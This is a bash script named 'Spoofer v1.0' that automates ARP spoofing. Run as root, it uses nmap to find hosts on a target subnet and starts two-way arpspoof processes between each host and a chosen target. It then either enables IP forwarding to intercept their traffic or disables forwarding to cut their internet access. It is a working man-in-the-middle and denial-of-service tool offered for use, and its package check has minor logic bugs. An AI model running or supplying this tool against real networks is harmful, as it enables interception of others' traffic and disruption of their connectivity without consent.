#!/bin/bash

TMP_FILE="/tmp/killer.pid"
RED="\033[0;31m"
GREEN="\033[0;32m"
NC="\033[0m"

func_help()
{
    echo -e ""
    echo -e " Usage: $0 start|stop connect|disconnect <target-ip[/cidr]> [excluded-ip]"
    echo -e ""
    echo -e "  * start|stop          -> Start/Stop attack"
    echo -e "  * connect|disconnect  -> Enable/Disable internet connection on target machine"
    echo -e "  * CIDR is only available from 1 to 32"
    echo -e "  * You can exclude IP Addresses on 4th argument with comma (,) separated"
    echo -e ""
}

func_check_ip()
{
    local IP=$1
    local RESULT=1

    if [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        IP=($(echo $IP | tr '.' '\n'))
        [[ ${IP[0]} -le 255 && ${IP[1]} -le 255 && ${IP[2]} -le 255 && ${IP[3]} -le 255 ]]
        RESULT=$?
    fi

    return $RESULT
}

func_check_prerequires()
{
	local ALL_PACKAGE_INSTALLED=1
	echo "Checking required packages..."
	for i in $(echo "macchanger|arpspoof" | tr "|" " ")
	do
		sleep 1
		IS_PACKAGE_EXIST=$(dpkg-query -W --showformat='${Status}\n' $i 2>/dev/null | grep -c "ok installed")
		if [[ $IS_PACKAGE_EXIST == " " ]]
		then
			printf "[error] ${RED}$i not installed...$NC\n"
			ALL_PACKAGE_INSTALLED=0
		else
			printf "[ok] ${GREEN}$i installed...$NC\n"
		fi
	done
	if [[ ! $ALL_PACKAGE_INSTALLED ]]
	then
		exit 1
	fi
}

if [[ $EUID -ne 0 ]] 
then 
    echo -e "\n ERR: You must run this script as root.\n"
    exit 1
fi


ACTION=$1
INET=$2
TARGET=$3
EXCLUDED_IP=$4

[[ -z $ACTION ]] && func_help && exit 1

case $ACTION in
    start|stop) ;;
    *) func_help && exit 1;;
esac

func_check_prerequires

if [[ $ACTION == "stop" ]]
then
    if [[ -f $TMP_FILE ]]
    then
        echo -e "\n [*] Stopping all process..."
    	sysctl -q net.ipv4.ip_forward=0
        for PID in `cat $TMP_FILE`
        do
            echo -e "     * Stopping $PID..."
            kill $PID > /dev/null 2>&1
        done
        echo -e " [*] Done!\n"
        rm -f $TMP_FILE
        exit
    else
        echo -e " No process is running"
        exit 1
    fi
fi

case $INET in
    connect|disconnect) ;;
    *) func_help && exit 1;;
esac

if [[ -f $TMP_FILE ]]
then
    echo -e "\n A process is already running...\n"
    exit 1
fi

[[ -z $TARGET ]] && func_help && exit 1

if [[ ! -z `echo $TARGET | grep '/'` ]]
then
    CIDR=$(echo $TARGET | cut -d '/' -f2)
    [[ $CIDR =~ ^[0-9]+$ ]] && [[ $CIDR -gt 32 || $CIDR -lt 1 ]] && echo -e "\n ERR: Invalid CIDR range! Should be 1-32\n" && exit 1
    CIDR="/$CIDR"
fi

TARGET_IP=$(echo $TARGET | cut -d '/' -f1)
TARGET_NETWORK="${TARGET_IP}${CIDR}"
MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ',')
EXCLUDED_IP="${MY_IP}${EXCLUDED_IP}"

for IP in $(echo "$TARGET_IP $EXCLUDED_IP" | tr ',' ' ')
do
    if ! func_check_ip $IP
    then
        echo -e " ERR: Invalid IP Address: $IP"
        INVALID_IP=true
    fi
done

[[ ! -z $INVALID_IP ]] && exit 1

echo -e ""
echo -e " Spoofer v1.0"
echo -e ""
echo -e " +"
echo -e " | Target IP Address   : $TARGET_NETWORK"
echo -e " | Excluded IP Address : $(echo $EXCLUDED_IP | tr ',' ' ')"
echo -e " +"
echo -e ""

echo -e " [*] Scanning IP Addresses..."
for IP in $(nmap -sn -n ${TARGET_NETWORK} | grep for | cut -d ' ' -f 5-)
do
    if [[ $IP != $TARGET_IP && $IP != $MY_IP && $EXCLUDED_IP != *"$IP"* ]]
    then
        echo -ne "     * Spoofing $IP...\t"
	arpspoof -t $IP $TARGET_IP > /dev/null 2>&1 &
        PID=$!
        echo $PID >> $TMP_FILE
        echo -ne "(PID: $PID,"
	arpspoof -t $TARGET_IP $IP > /dev/null 2>&1 &
        PID=$!
        echo $PID >> $TMP_FILE
        echo -e "$PID)"
    fi
done

if [[ $INET == "connect" ]]
then
    echo -e " [*] Forwarding internet access..."
    sysctl -q net.ipv4.ip_forward=1
elif [[ $INET == "disconnect" ]]
then
    echo -e " [*] Dropping internet access..."
    sysctl -q net.ipv4.ip_forward=0
fi
echo -e " [*] Done!\n"
